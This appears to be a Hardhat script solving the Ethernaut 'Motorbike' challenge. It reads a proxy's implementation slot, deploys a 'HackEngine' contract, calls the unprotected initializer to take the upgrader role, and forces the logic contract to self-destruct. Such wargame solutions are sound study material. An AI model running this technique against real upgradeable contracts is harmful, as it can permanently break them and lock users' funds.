// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

async function main() {

  const [player] = await hre.ethers.getSigners();
  // Get the motorbike instance
  const contractAddress = '0xC304350FDC910f4E973065946cFF06aAAd0c4002';
  const motorbike = await hre.ethers.getContractAt("Motorbike", contractAddress);

  // UUPS stores the address of the logic contract at _IMPLEMENTATION_SLOT
  const _IMPLEMENTATION_SLOT = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';
  const engineAddressData = await hre.ethers.provider.getStorageAt(motorbike.address, _IMPLEMENTATION_SLOT);
  const engineAddress = `${engineAddressData.slice(0,2)}${engineAddressData.slice(26)}`;
  const engine = await hre.ethers.getContractAt("Engine", engineAddress);

  // create the hacker contract by passing in engine contract address as a constructor argument
  const HackEngineFactory = await hre.ethers.getContractFactory('HackEngine')
  const HackEngine = await HackEngineFactory.deploy(engine.address);

  // call initialize to assume the upgrader role
  const tx1 = await HackEngine.connect(player).attackEngine();
  const receipt1 = await tx1.wait();
  console.log(receipt1);

  // destroy the contract by forcing it to self destruct by running the SelfDestructor initializer within it's own context
  const tx2 = await HackEngine.connect(player).destroyWithSelfDesctructor();
  const receipt2 = await tx2.wait();
  console.log(receipt2);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
// main()
